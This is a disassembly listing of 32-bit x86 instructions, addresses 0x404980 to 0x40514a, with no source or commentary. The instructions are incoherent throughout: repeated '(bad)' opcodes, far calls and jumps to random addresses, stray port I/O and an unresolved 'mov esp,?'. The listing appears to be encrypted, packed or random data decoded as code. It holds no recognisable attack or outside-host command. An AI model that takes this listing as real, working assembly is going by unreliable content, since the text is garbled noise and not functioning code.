  404980:	imul   ebp,DWORD PTR [eax+0x4f206f33],0x2a
  404987:	cmp    DWORD PTR [eax-0x6bf0c26f],0xa9eef50e
  404991:	rol    eax,cl
  404993:	out    0x2c,eax
  404995:	add    eax,0xc6b9051c
  40499a:	sub    DWORD PTR [ebp-0x53017e1d],ebx
  4049a0:	jge    0x40495c
  4049a2:	pop    ecx
  4049a3:	aad    0x32
  4049a5:	sub    ecx,DWORD PTR [ecx]
  4049a7:	cdq    
  4049a8:	mov    dh,0xd1
  4049aa:	mov    dl,0x1c
  4049ac:	push   ebx
  4049ad:	sub    ah,BYTE PTR [esi-0x7c83fd50]
  4049b3:	stos   DWORD PTR es:[edi],eax
  4049b4:	mov    ah,0x65
  4049b6:	push   edi
  4049b7:	sub    DWORD PTR [eax+0x5d8840a4],esp
  4049bd:	push   esp
  4049be:	jl     0x404943
  4049c0:	mov    ebx,0xf66f7b2b
  4049c5:	pop    eax
  4049c6:	adc    edx,ebp
  4049c8:	les    eax,FWORD PTR [ebx-0x46]
  4049cb:	retf   
  4049cc:	fst    DWORD PTR [ebp+ecx*8-0x4]
  4049d0:	add    al,0x9
  4049d2:	mov    cl,0x6a
  4049d4:	push   esi
  4049d5:	mov    dh,al
  4049d7:	dec    ebx
  4049d8:	aas    
  4049d9:	fwait
  4049da:	cwde   
  4049db:	(bad)  
  4049dc:	jns    0x404974
  4049de:	aam    0x4b
  4049e0:	outs   dx,BYTE PTR ds:[esi]
  4049e1:	(bad)  
  4049e2:	cld    
  4049e3:	inc    DWORD PTR [esi-0x33fc5d72]
  4049e9:	rcl    esp,1
  4049eb:	retf   0x3b83
  4049ee:	or     eax,0x4e16901b
  4049f3:	icebp  
  4049f4:	stos   BYTE PTR es:[edi],al
  4049f5:	shl    DWORD PTR [esi+0x33],0x51
  4049f9:	dec    ecx
  4049fa:	test   cl,0xa8
  4049fd:	cmc    
  4049fe:	push   esi
  4049ff:	adc    ebx,0x4
  404a02:	std    
  404a03:	js     0x4049cb
  404a05:	add    al,bl
  404a07:	rol    DWORD PTR [eax],1
  404a09:	jo     0x40499c
  404a0b:	cmp    bl,dh
  404a0d:	pop    edi
  404a0e:	dec    ebp
  404a0f:	pop    esp
  404a10:	(bad)  
  404a11:	bound  esi,QWORD PTR [edx]
  404a13:	cmc    
  404a14:	imul   ebx,DWORD PTR [ebp+0x44a9cdc7],0xffffffb3
  404a1b:	in     al,0x2b
  404a1d:	lods   al,BYTE PTR ds:[esi]
  404a1e:	daa    
  404a1f:	dec    esi
  404a20:	push   edx
  404a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a22:	push   edx
  404a23:	neg    DWORD PTR [edx+0x716b9e35]
  404a29:	mov    dh,0x7d
  404a2b:	xchg   esi,eax
  404a2c:	mov    ds:0xe8375ea3,eax
  404a31:	in     al,dx
  404a32:	std    
  404a33:	inc    ebp
  404a34:	lds    eax,FWORD PTR [edi+edi*8]
  404a37:	aam    0x38
  404a39:	xlat   BYTE PTR ds:[ebx]
  404a3a:	lea    esp,[esi+0x27adfda6]
  404a40:	add    bh,ah
  404a42:	and    ebx,0xeb22a470
  404a48:	fimul  DWORD PTR ds:[edx-0x77bb5968]
  404a4f:	cmc    
  404a50:	pop    edi
  404a51:	push   0xcbbbbfda
  404a56:	imul   ebx,DWORD PTR [edx+0x25],0x43
  404a5a:	out    0x51,eax
  404a5c:	inc    ebp
  404a5d:	inc    esp
  404a5e:	cmp    BYTE PTR [edx+0xc11cf56],0x51
  404a65:	dec    ebp
  404a66:	outs   dx,BYTE PTR ds:[esi]
  404a67:	jecxz  0x404a91
  404a69:	jp     0x404a64
  404a6b:	jg     0x404aaa
  404a6d:	clc    
  404a6e:	sbb    ebx,0x6ccabe19
  404a74:	push   esp
  404a75:	shl    bh,0x7b
  404a78:	push   ecx
  404a79:	jb     0x404a65
  404a7b:	mov    edx,0x4e519781
  404a80:	mov    bl,0x83
  404a82:	xchg   ebx,eax
  404a83:	jno    0x404a4a
  404a85:	mov    eax,0xc03da459
  404a8a:	jecxz  0x404a42
  404a8c:	std    
  404a8d:	push   esp
  404a8e:	jbe    0x404a2f
  404a90:	gs cwde 
  404a92:	test   DWORD PTR [edi],esi
  404a94:	test   DWORD PTR [ecx],esi
  404a96:	loope  0x404a25
  404a98:	sub    bh,bh
  404a9a:	mov    al,0x3e
  404a9c:	arpl   WORD PTR [esi-0x51],bp
  404a9f:	push   ecx
  404aa0:	xchg   ebp,eax
  404aa1:	fnsave ds:[ebp-0x6922c281]
  404aa8:	or     ch,BYTE PTR [ebx-0x15b60ecb]
  404aae:	or     eax,0x86ad6a2b
  404ab3:	iret   
  404ab4:	jno    0x404aa1
  404ab6:	jne    0x404aee
  404ab8:	mov    al,0xc2
  404aba:	mov    al,0x9c
  404abc:	and    eax,0x7c1f974d
  404ac1:	push   edx
  404ac2:	sbb    esi,DWORD PTR [eax-0x4c]
  404ac5:	fmul   st(7),st
  404ac7:	and    ch,cl
  404ac9:	adc    edx,DWORD PTR ds:0x20c3f5af
  404acf:	inc    ecx
  404ad0:	addr16 pop edi
  404ad2:	je     0x404afa
  404ad4:	mov    dh,dl
  404ad6:	hlt    
  404ad7:	call   0x9d01c632
  404adc:	push   edx
  404add:	lods   al,BYTE PTR ds:[esi]
  404ade:	push   esi
  404adf:	ror    DWORD PTR [edi],cl
  404ae1:	call   0xc6727006
  404ae6:	jnp    0x404b5e
  404ae8:	or     DWORD PTR [eax+0x39],eax
  404aeb:	inc    ebx
  404aec:	daa    
  404aed:	std    
  404aee:	push   ds
  404aef:	jg     0x404a7f
  404af1:	cmp    esi,ebp
  404af3:	xlat   BYTE PTR ds:[ebx]
  404af4:	lock jnp 0x404a85
  404af7:	inc    esi
  404af8:	icebp  
  404af9:	and    ecx,DWORD PTR [esi+0x4a]
  404afc:	and    eax,0x8eb6c764
  404b01:	mov    ds:0xcac3c10d,eax
  404b06:	idiv   DWORD PTR [edx+0x305dd035]
  404b0c:	cmp    BYTE PTR [ebx+0x67cbf447],cl
  404b12:	push   ss
  404b13:	adc    BYTE PTR [edi-0x365d99b0],ch
  404b19:	inc    ebx
  404b1a:	call   0xe9cf7204
  404b1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b20:	(bad)  
  404b21:	daa    
  404b22:	pop    edx
  404b23:	scas   al,BYTE PTR es:[edi]
  404b24:	test   ebp,edx
  404b26:	xor    ah,BYTE PTR [ebx-0x40ddaf29]
  404b2c:	outs   dx,BYTE PTR ds:[esi]
  404b2d:	cli    
  404b2e:	mov    dh,0xa9
  404b30:	pop    esi
  404b31:	and    esp,eax
  404b33:	or     al,0x17
  404b35:	xchg   ebp,eax
  404b36:	pop    edx
  404b37:	cdq    
  404b38:	lods   al,BYTE PTR ds:[esi]
  404b39:	pop    ds
  404b3a:	sbb    ah,BYTE PTR [ebx-0x3]
  404b3d:	add    dl,0x8c
  404b40:	lea    ecx,[edi+0x114aaf5]
  404b46:	inc    ecx
  404b47:	pop    eax
  404b48:	mov    al,ds:0x299ca186
  404b4d:	fnstcw WORD PTR [esi]
  404b4f:	daa    
  404b50:	dec    ebx
  404b51:	sub    DWORD PTR [eax+0x38],0x6c771811
  404b58:	and    dl,ah
  404b5a:	cmp    al,0xf6
  404b5c:	inc    esp
  404b5d:	xchg   edx,eax
  404b5e:	sti    
  404b5f:	aaa    
  404b60:	push   esi
  404b61:	sar    DWORD PTR [eax+0x7a],0xfe
  404b65:	stos   BYTE PTR es:[edi],al
  404b66:	fs ss xchg ebp,eax
  404b69:	shl    DWORD PTR [ebp-0x7b068156],0xb5
  404b70:	fadd   st(5),st
  404b72:	cli    
  404b73:	or     DWORD PTR [ecx+eiz*2+0x55],ecx
  404b77:	fdivr  DWORD PTR [ebp+0x70]
  404b7a:	inc    ecx
  404b7b:	inc    edi
  404b7c:	push   0x7d
  404b7e:	scas   al,BYTE PTR es:[edi]
  404b7f:	outs   dx,DWORD PTR ds:[esi]
  404b80:	(bad)  
  404b81:	jg     0x404b55
  404b83:	sub    edi,edx
  404b85:	mov    esp,?
  404b87:	dec    ebx
  404b88:	shl    BYTE PTR [ebx+0x7099aee6],cl
  404b8e:	rcr    ch,0xea
  404b91:	or     BYTE PTR [edx],al
  404b93:	fnstenv [ecx-0x4676b1f7]
  404b99:	jge    0x404b93
  404b9b:	xchg   ebx,eax
  404b9c:	mov    ebp,0xd8a816b
  404ba1:	jns    0x404bdb
  404ba3:	sub    eax,0xaecd0cc7
  404ba8:	mov    cl,BYTE PTR [ebp-0x379e34e]
  404bae:	cmp    eax,0x4203a5bb
  404bb3:	frstor [esp+ebp*4]
  404bb6:	mov    dh,0xf9
  404bb8:	xor    ebx,DWORD PTR [ebp+0x5f]
  404bbb:	pop    edx
  404bbc:	pushf  
  404bbd:	popaw  
  404bbf:	mov    eax,0x16e03134
  404bc4:	(bad)  
  404bc5:	clc    
  404bc6:	ins    DWORD PTR es:[edi],dx
  404bc7:	lods   al,BYTE PTR ds:[esi]
  404bc8:	divps  xmm3,XMMWORD PTR [esi+0x5ef309da]
  404bcf:	(bad)  
  404bd1:	stos   BYTE PTR es:[edi],al
  404bd2:	pop    edi
  404bd3:	int3   
  404bd4:	mov    ebp,DWORD PTR [esi-0x4b]
  404bd7:	repnz ins DWORD PTR es:[edi],dx
  404bd9:	pop    ds
  404bda:	in     al,dx
  404bdb:	inc    edx
  404bdc:	mov    DWORD PTR [esi+0x4c],ebp
  404bdf:	aam    0x9f
  404be1:	out    dx,al
  404be2:	daa    
  404be3:	adc    BYTE PTR [ebx-0x76bb7b16],bh
  404be9:	mov    esp,DWORD PTR [ebp-0x8]
  404bec:	jl     0x404bc9
  404bee:	addr16 sub eax,0x6cda657c
  404bf4:	inc    ebx
  404bf5:	jbe    0x404be7
  404bf7:	sbb    ch,BYTE PTR [edx]
  404bf9:	popf   
  404bfa:	outs   dx,BYTE PTR ds:[esi]
  404bfb:	(bad)  
  404bfc:	call   0x7cc4:0xa45f34aa
  404c03:	inc    esi
  404c04:	and    dh,BYTE PTR [edx]
  404c06:	adc    BYTE PTR [eax],dl
  404c08:	(bad)  
  404c09:	outs   dx,DWORD PTR ds:[esi]
  404c0a:	retf   0xc6d8
  404c0d:	mov    eax,0x2e9f0352
  404c12:	pusha  
  404c13:	push   sp
  404c15:	cs cmc 
  404c17:	jne    0x404be2
  404c19:	iret   
  404c1a:	ss pop ebp
  404c1c:	ret    
  404c1d:	fist   WORD PTR [edx]
  404c1f:	nop
  404c20:	push   edi
  404c21:	imul   ebp,DWORD PTR [edi-0x10393084],0xe11d316a
  404c2b:	pop    ebp
  404c2c:	scas   al,BYTE PTR es:[edi]
  404c2d:	repnz outs dx,DWORD PTR ds:[esi]
  404c2f:	jbe    0x404c27
  404c31:	(bad)  
  404c32:	and    dl,ch
  404c34:	sbb    DWORD PTR [esi],ebp
  404c36:	adc    al,0xc0
  404c38:	mov    ds:0x17a3fd5d,al
  404c3d:	ffreep st(5)
  404c3f:	dec    esi
  404c40:	shr    DWORD PTR [esi+0x1bbc06f6],0x16
  404c47:	push   ebp
  404c48:	and    ebx,DWORD PTR [ecx+0x435ad213]
  404c4e:	cmp    esi,ebx
  404c50:	sub    al,0xa4
  404c52:	mov    ebp,edx
  404c54:	sbb    ebp,DWORD PTR [ebp+0x17]
  404c57:	sbb    DWORD PTR [esi+0x502da79d],ebp
  404c5d:	adc    eax,0xdfe1046d
  404c62:	js     0x404c51
  404c64:	xchg   esi,eax
  404c65:	mov    esi,0xd007aa7b
  404c6a:	push   0x6d
  404c6c:	sbb    eax,0xcbc6a3a3
  404c71:	push   ds
  404c72:	iret   
  404c73:	or     edi,DWORD PTR [ebx-0xc20b0fe]
  404c79:	ds pop edi
  404c7b:	adc    al,0x28
  404c7d:	fisttp WORD PTR [ebx+0xf0f3151]
  404c83:	or     edi,edx
  404c85:	bound  eax,QWORD PTR [edi]
  404c87:	in     eax,0x38
  404c89:	dec    dl
  404c8b:	cmp    DWORD PTR [ebp-0x6da9e62e],ebx
  404c91:	inc    ecx
  404c92:	jbe    0x404c33
  404c94:	xchg   edi,eax
  404c95:	adc    ah,bl
  404c97:	add    dh,BYTE PTR [edi+0x6861722c]
  404c9d:	fcomp  DWORD PTR [edi]
  404c9f:	or     al,0xfa
  404ca1:	mov    esp,0xe4d19367
  404ca6:	mov    ebp,0xb4d6a11c
  404cab:	mov    ebp,0x5fa9ab47
  404cb0:	loopne 0x404cbb
  404cb2:	repnz es stos DWORD PTR es:[edi],eax
  404cb5:	jmp    0x2b453ef9
  404cba:	arpl   ax,bx
  404cbc:	cmp    ecx,eax
  404cbe:	adc    dh,ch
  404cc0:	xchg   ebx,eax
  404cc1:	mov    esi,0x9a21e560
  404cc6:	xchg   esp,eax
  404cc7:	sar    DWORD PTR [esi],1
  404cc9:	das    
  404cca:	sbb    al,0x8
  404ccc:	xor    dl,BYTE PTR [edx-0x46]
  404ccf:	es leave 
  404cd1:	test   eax,0x7193a47
  404cd6:	pop    esp
  404cd7:	and    eax,0xcae4b7fb
  404cdc:	enter  0x7f7b,0x2a
  404ce0:	rcl    BYTE PTR [ebp+0x24],cl
  404ce3:	xchg   ebx,eax
  404ce4:	push   edi
  404ce5:	fistp  QWORD PTR [edx-0x1c]
  404ce8:	retf   
  404ce9:	mov    eax,0xfae7bf02
  404cee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cef:	jmp    0x35fa7e4b
  404cf4:	sub    eax,0x953563a
  404cf9:	loop   0x404c95
  404cfb:	sub    DWORD PTR [ebx+0x40ff9f21],edi
  404d01:	mov    ebx,0x65391bb9
  404d06:	push   ecx
  404d07:	dec    ebp
  404d08:	bound  ebp,QWORD PTR ds:0x9afaac1e
  404d0e:	cli    
  404d0f:	mov    BYTE PTR [edx+edi*4],cl
  404d12:	stos   DWORD PTR es:[edi],eax
  404d13:	sbb    BYTE PTR [ebx+edi*2+0x70],cl
  404d17:	icebp  
  404d18:	call   0x188a:0x275b4302
  404d1f:	adc    eax,0xd8b59d69
  404d24:	test   eax,esp
  404d26:	ja     0x404d9f
  404d28:	jo     0x404cd3
  404d2a:	and    cl,0x2b
  404d2d:	loop   0x404d22
  404d2f:	ss mov edx,0xddf707d
  404d35:	aaa    
  404d36:	jle    0x404d63
  404d38:	mov    ah,0xd1
  404d3a:	dec    esp
  404d3b:	pushf  
  404d3c:	aam    0x67
  404d3e:	xor    esp,0x309f4cc2
  404d44:	fs xor ebx,edi
  404d47:	jo     0x404dbd
  404d49:	mov    eax,0x8481eb64
  404d4e:	inc    ebx
  404d4f:	dec    esp
  404d50:	push   ebx
  404d52:	or     eax,0x2f5fed0b
  404d57:	cmp    ebx,DWORD PTR ds:0x58f87c9d
  404d5d:	dec    edx
  404d5e:	gs cmp al,0xd
  404d61:	mov    al,ds:0x18471145
  404d66:	das    
  404d67:	pusha  
  404d68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d69:	daa    
  404d6a:	xor    ah,dl
  404d6c:	mov    edx,0xd5f586e3
  404d71:	add    edx,DWORD PTR [eax-0x1a77d41d]
  404d77:	and    DWORD PTR [edx],ecx
  404d79:	pop    eax
  404d7a:	clc    
  404d7b:	xchg   DWORD PTR [ebx-0x2e],ebp
  404d7e:	jb     0x404df1
  404d80:	cmp    edx,DWORD PTR [ebp-0x16]
  404d83:	xchg   esi,edi
  404d85:	bound  ebx,QWORD PTR [edi+0x13]
  404d88:	out    dx,eax
  404d89:	or     esi,DWORD PTR [ebx-0x4f0afc3e]
  404d8f:	imul   esi,DWORD PTR [esi+edi*4],0xffffffce
  404d93:	inc    edx
  404d94:	rcl    BYTE PTR [ebx+ebx*4-0x4a],0x3f
  404d99:	lock inc ebp
  404d9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d9c:	add    DWORD PTR [ebp+0x3],0xc76e6295
  404da3:	lahf   
  404da4:	and    al,0x45
  404da6:	fdiv   st,st(3)
  404da8:	mov    bh,BYTE PTR ds:0x5c2ec54f
  404dae:	in     eax,0xcd
  404db0:	js     0x404d45
  404db2:	jmp    DWORD PTR [ebp-0x4ba1db5c]
  404db8:	jo     0x404d45
  404dba:	dec    ebx
  404dbb:	cs ss ins DWORD PTR es:[edi],dx
  404dbe:	jne    0x404d64
  404dc0:	and    DWORD PTR [eax+0x2e],esp
  404dc3:	gs repz scas eax,DWORD PTR es:[edi]
  404dc6:	add    dh,BYTE PTR [ebx+ebx*8]
  404dc9:	pop    ebx
  404dca:	push   ebx
  404dcb:	xor    ebp,edi
  404dcd:	cmc    
  404dce:	std    
  404dcf:	sub    al,dl
  404dd1:	fsub   st(0),st
  404dd3:	nop
  404dd4:	and    al,dh
  404dd6:	not    BYTE PTR [eax+0x3]
  404dd9:	jmp    0x404e36
  404ddb:	inc    edx
  404ddc:	sub    bl,BYTE PTR [ebx-0x66fccd8]
  404de2:	pop    ebx
  404de3:	and    eax,0x7ecaafc0
  404de8:	dec    ebp
  404de9:	jle    0x404dd4
  404deb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dec:	inc    ebp
  404ded:	pop    ebp
  404dee:	fsub   DWORD PTR [edi-0x75]
  404df1:	adc    BYTE PTR [edx+0x2471791a],ah
  404df7:	and    ebx,DWORD PTR [ebp-0x57d5f52c]
  404dfd:	push   ebx
  404dfe:	push   ebx
  404dff:	loop   0x404e59
  404e01:	jo     0x404e21
  404e03:	in     eax,dx
  404e04:	popa   
  404e05:	mov    bl,0x51
  404e07:	mov    dl,0xb
  404e09:	mov    esp,0xa3e1df8
  404e0e:	ja     0x404e71
  404e10:	mov    edi,ss
  404e12:	ret    0x19b2
  404e15:	dec    ebx
  404e16:	or     eax,0xaf499e9
  404e1b:	mov    ds:0xa848314e,al
  404e20:	(bad)  
  404e21:	mov    ah,0x7
  404e23:	ins    DWORD PTR es:[edi],dx
  404e24:	sbb    DWORD PTR [ebx+edi*8-0x795c56b8],eax
  404e2b:	icebp  
  404e2c:	mov    ebp,0x40bbeb0b
  404e31:	clc    
  404e32:	push   0xffffffc6
  404e34:	sbb    DWORD PTR [ecx],esi
  404e36:	push   edi
  404e37:	adc    ah,BYTE PTR ds:0x35ea0c68
  404e3d:	mov    dx,WORD PTR [edi-0x31]
  404e41:	mov    ch,0x63
  404e43:	adc    eax,0xb0d8f5bd
  404e48:	dec    eax
  404e49:	jl     0x404ec2
  404e4b:	pop    ecx
  404e4c:	out    dx,al
  404e4d:	add    DWORD PTR [edx-0x35],esi
  404e50:	test   eax,0xfae64d67
  404e55:	mov    ah,0xbc
  404e57:	inc    eax
  404e58:	adc    BYTE PTR [edx],bh
  404e5a:	sub    eax,0xb4b244fc
  404e5f:	xchg   edi,eax
  404e60:	add    cl,BYTE PTR [ebp-0x51]
  404e63:	shl    BYTE PTR [edx],1
  404e65:	imul   ebp,DWORD PTR [eax-0x61],0x73f51b86
  404e6c:	cdq    
  404e6d:	cli    
  404e6e:	and    bl,cl
  404e70:	out    dx,eax
  404e71:	mov    eax,ds:0x59f6ddb7
  404e76:	adc    BYTE PTR [eax-0x526a9b7c],0xaa
  404e7d:	push   ecx
  404e7e:	and    eax,0x210141cb
  404e83:	test   eax,0xdb05acc4
  404e88:	xchg   esp,eax
  404e89:	push   es
  404e8a:	inc    ecx
  404e8b:	js     0x404e76
  404e8d:	mov    ah,0x44
  404e8f:	jb     0x404e60
  404e91:	push   edx
  404e92:	pop    eax
  404e93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e94:	sbb    cl,bl
  404e96:	mov    bh,0xb0
  404e98:	test   eax,0x18a57500
  404e9d:	outs   dx,DWORD PTR ds:[esi]
  404e9e:	psadbw mm6,QWORD PTR [edx-0x233846]
  404ea5:	lods   al,BYTE PTR ds:[esi]
  404ea6:	stc    
  404ea7:	and    ebp,esi
  404ea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404eaa:	mov    dl,0xae
  404eac:	out    dx,eax
  404ead:	dec    edi
  404eae:	jb     0x404e37
  404eb0:	pop    eax
  404eb1:	retf   
  404eb2:	and    al,0x5
  404eb4:	cli    
  404eb5:	pop    es
  404eb6:	pushf  
  404eb7:	rcl    al,0x87
  404eba:	or     BYTE PTR [eax],bl
  404ebc:	leave  
  404ebd:	nop
  404ebe:	jmp    0x404ea7
  404ec0:	jb     0x404f36
  404ec2:	fcomp  QWORD PTR [ebx-0x51]
  404ec5:	mov    WORD PTR [esi],fs
  404ec7:	test   al,0x72
  404ec9:	ins    DWORD PTR es:[edi],dx
  404eca:	xchg   esp,eax
  404ecb:	jnp    0x404e94
  404ecd:	fnsave [ecx+0x49]
  404ed0:	or     ecx,0x7a
  404ed3:	sbb    BYTE PTR [ebx-0x60],bh
  404ed6:	arpl   si,di
  404ed8:	jno    0x404f0e
  404eda:	call   eax
  404edc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404edd:	fisubr DWORD PTR [esi+ebp*8]
  404ee0:	mov    bl,dh
  404ee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ee3:	sub    ebp,DWORD PTR [ebx-0x2c374b69]
  404ee9:	fwait
  404eea:	mov    cl,0x19
  404eec:	push   ebp
  404eed:	push   edx
  404eee:	dec    ecx
  404eef:	inc    ebp
  404ef0:	pop    ss
  404ef1:	mov    esi,0xc5cad903
  404ef6:	cld    
  404ef7:	mov    dh,BYTE PTR [eax-0x11a1f51f]
  404efd:	add    edi,edi
  404eff:	cmc    
  404f00:	call   FWORD PTR [edx+0x74a757f5]
  404f06:	xchg   ebx,eax
  404f07:	bound  ecx,QWORD PTR [ebx+0x758cf07f]
  404f0d:	pop    ss
  404f0e:	std    
  404f0f:	stos   DWORD PTR es:[edi],eax
  404f10:	call   0xc901d112
  404f15:	iret   
  404f16:	sbb    eax,0x5fd8c97d
  404f1b:	inc    esi
  404f1c:	pop    es
  404f1d:	cwde   
  404f1e:	mov    eax,0x64114ed7
  404f23:	inc    ebp
  404f24:	fdiv   QWORD PTR [ebx]
  404f26:	fmul   DWORD PTR [esi-0x41]
  404f29:	imul   esp,DWORD PTR [edi-0x35],0xf18c5223
  404f30:	pop    esp
  404f31:	xor    dl,BYTE PTR [edx-0x56]
  404f34:	popfw  
  404f36:	ds pop eax
  404f38:	mov    ebp,ds
  404f3a:	retf   
  404f3b:	(bad)  
  404f3c:	ss push cs
  404f3e:	test   BYTE PTR ds:0x66221ac8,al
  404f44:	mov    ah,0x36
  404f46:	stc    
  404f47:	mov    ecx,0x26d6c88
  404f4c:	add    eax,0xee4ffd3
  404f51:	cs retf 0xbf6b
  404f55:	push   edx
  404f56:	xchg   ebx,eax
  404f57:	dec    ebp
  404f58:	hlt    
  404f59:	jns    0x404f5d
  404f5b:	jae    0x404efb
  404f5d:	add    al,0xf8
  404f5f:	push   edx
  404f60:	loopne 0x404f50
  404f62:	out    dx,eax
  404f63:	loopne 0x404f4f
  404f65:	leave  
  404f66:	add    al,0x35
  404f68:	cmc    
  404f69:	mov    al,ds:0x634786ad
  404f6e:	jbe    0x404f6f
  404f70:	add    ch,ch
  404f72:	dec    eax
  404f73:	dec    edx
  404f74:	pop    ds
  404f75:	inc    esi
  404f76:	loop   0x404f5b
  404f78:	mov    esp,0x611be517
  404f7d:	mov    esp,DWORD PTR [ecx+0x70]
  404f80:	cmc    
  404f81:	test   al,0x7b
  404f83:	push   edi
  404f84:	mov    ebp,0x1cef473
  404f89:	lock (bad) 
  404f8b:	mov    edx,0x9e3fe02
  404f90:	xchg   BYTE PTR [eax],dl
  404f92:	xchg   ecx,eax
  404f93:	add    al,0x75
  404f95:	mov    ds:0x6b5dcd7f,al
  404f9a:	add    dl,cl
  404f9c:	cmp    BYTE PTR [eax-0x1d],0xa6
  404fa0:	das    
  404fa1:	retf   
  404fa2:	sar    dh,1
  404fa4:	fdiv   DWORD PTR [edi-0x3e]
  404fa7:	xor    eax,0x60c93a7a
  404fac:	pushf  
  404fad:	popa   
  404fae:	jg     0x404fda
  404fb0:	xchg   edx,eax
  404fb1:	sub    ebp,DWORD PTR [edx]
  404fb3:	jo     0x404fd4
  404fb5:	aas    
  404fb6:	lods   al,BYTE PTR ds:[esi]
  404fb7:	in     eax,dx
  404fb8:	jne    0x404f5b
  404fba:	jo     0x40500f
  404fbc:	mov    ebx,0x2ba6dfa7
  404fc1:	ret    0xf303
  404fc4:	add    DWORD PTR [ecx+edi*4],esp
  404fc7:	mov    eax,0x67c5fc2c
  404fcc:	mov    al,ds:0x30eb843e
  404fd1:	jl     0x404fc3
  404fd3:	or     esp,DWORD PTR [esi]
  404fd5:	sub    dl,0x6
  404fd8:	popa   
  404fd9:	push   0x1b
  404fdb:	mov    cl,0xd
  404fdd:	inc    esi
  404fde:	xchg   edx,eax
  404fdf:	cwde   
  404fe0:	retf   0x810a
  404fe3:	pusha  
  404fe4:	mov    edx,0xf6fe9906
  404fe9:	int    0x53
  404feb:	inc    esp
  404fec:	push   0x4c
  404fee:	les    esp,FWORD PTR [ecx-0xa95ec91]
  404ff4:	mov    ebx,0x223938c2
  404ff9:	xchg   DWORD PTR [edi+0x61],edx
  404ffc:	jmp    0x5624:0x5e5b9e98
  405003:	pop    ss
  405004:	xchg   BYTE PTR [edx],bh
  405006:	pop    esi
  405007:	out    0xd,eax
  405009:	jne    0x405044
  40500b:	imul   ebx,DWORD PTR [esi-0x644f5217],0x1f
  405012:	mov    eax,0xb69910df
  405017:	mov    dh,0xe9
  405019:	push   es
  40501a:	repnz (bad) 
  40501c:	in     eax,0x41
  40501e:	retf   0x6241
  405021:	ds add esi,edi
  405024:	ficom  DWORD PTR [esp+edi*8+0x45]
  405028:	daa    
  405029:	iret   
  40502a:	sbb    eax,0x141fbd5c
  40502f:	mov    esi,0x4f4f5a3d
  405034:	(bad)  
  405035:	hlt    
  405036:	mov    ecx,0xe63bba48
  40503b:	loope  0x4050a3
  40503d:	scas   al,BYTE PTR es:[edi]
  40503e:	jmp    FWORD PTR ds:0x1993faaa
  405044:	cmc    
  405045:	call   0xc87f:0xd9f3f310
  40504c:	mov    DWORD PTR [edi],ecx
  40504e:	nop
  40504f:	mov    al,ds:0x39ee2bfc
  405054:	outs   dx,BYTE PTR ds:[esi]
  405055:	es dec ecx
  405057:	pop    ecx
  405058:	in     al,dx
  405059:	out    dx,eax
  40505a:	mov    esi,0x1ddc3489
  40505f:	scas   al,BYTE PTR es:[edi]
  405060:	fdivr  DWORD PTR [edx-0x2d]
  405063:	add    DWORD PTR [ecx-0x527e69bb],ebx
  405069:	fisttp WORD PTR [ebx]
  40506b:	jl     0x40508c
  40506d:	mov    al,ds:0x42b24500
  405072:	mov    ch,0x69
  405074:	(bad)  
  405076:	in     al,0x3d
  405078:	sbb    BYTE PTR [esi],ah
  40507a:	ret    0x7b82
  40507d:	bound  eax,QWORD PTR [ecx+esi*4]
  405080:	loope  0x40508c
  405082:	psubsw mm2,QWORD PTR [eax+eiz*2]
  405086:	inc    ebx
  405087:	(bad)  
  405088:	jle    0x4050f3
  40508a:	mov    WORD PTR [eax-0x22cfc0b0],gs
  405090:	out    0x31,al
  405092:	jge    0x405111
  405094:	push   ecx
  405095:	pop    edi
  405096:	stos   DWORD PTR es:[edi],eax
  405097:	lock xor BYTE PTR ds:0x54ea2271,dh
  40509e:	xchg   esi,eax
  40509f:	mov    eax,0x6dd06f7e
  4050a4:	inc    eax
  4050a5:	push   esi
  4050a6:	lea    edi,[ebp+esi*8-0x1b]
  4050aa:	(bad)  
  4050ab:	cwde   
  4050ac:	inc    ebp
  4050ad:	and    esi,ecx
  4050af:	aad    0xb8
  4050b1:	cli    
  4050b2:	jae    0x4050af
  4050b4:	test   BYTE PTR [eax+0x7c],al
  4050b7:	and    ebp,DWORD PTR [esi]
  4050b9:	std    
  4050ba:	adc    al,0xff
  4050bc:	jge    0x40508d
  4050be:	jmp    0xe067:0x37f3f936
  4050c5:	lds    eax,FWORD PTR [edi+0x5730e1f8]
  4050cb:	mov    bh,0x6a
  4050cd:	inc    esi
  4050ce:	outs   dx,DWORD PTR ss:[esi]
  4050d0:	ins    DWORD PTR es:[edi],dx
  4050d1:	cmp    DWORD PTR [edi+0x72aec2bd],0xdbd84a6b
  4050db:	cmp    DWORD PTR [eax-0x5b],ebx
  4050de:	repz add dh,BYTE PTR [eax-0x54]
  4050e2:	lea    esi,[esi-0x6410d3af]
  4050e8:	pop    edi
  4050e9:	out    dx,al
  4050ea:	xor    eax,0x5312ff25
  4050ef:	push   esp
  4050f0:	or     eax,0x3a6e63b8
  4050f5:	and    edi,0x16
  4050f8:	pop    eax
  4050f9:	loopne 0x405149
  4050fb:	icebp  
  4050fc:	loope  0x4050f5
  4050fe:	lock rcr BYTE PTR [eax+0x741f389f],0xda
  405106:	cmp    eax,0x53d86c1
  40510b:	shl    DWORD PTR [ebp+0x6d],0x4b
  40510f:	xor    eax,0x949b3f9c
  405114:	out    dx,al
  405115:	jp     0x405103
  405117:	or     eax,0x2b4c177f
  40511c:	rcl    al,1
  40511e:	sub    esi,DWORD PTR [edx]
  405120:	fmul   QWORD PTR [edx+0xf915453]
  405126:	cmp    al,0x4e
  405128:	retf   
  405129:	jns    0x4050c0
  40512b:	in     al,0x6c
  40512d:	sub    al,0x6a
  40512f:	push   edx
  405130:	xlat   BYTE PTR ds:[ebx]
  405131:	ds cs fsincos 
  405135:	shl    DWORD PTR ds:0x5d9e3a76,cl
  40513b:	fisttp QWORD PTR [edx+0x1bc829e1]
  405141:	ss test cl,0x77
  405145:	push   esp
  405146:	lods   eax,DWORD PTR ds:[esi]
  405147:	(bad)  
  405148:	mov    al,0x7b
  40514a:	xor    dh,dh
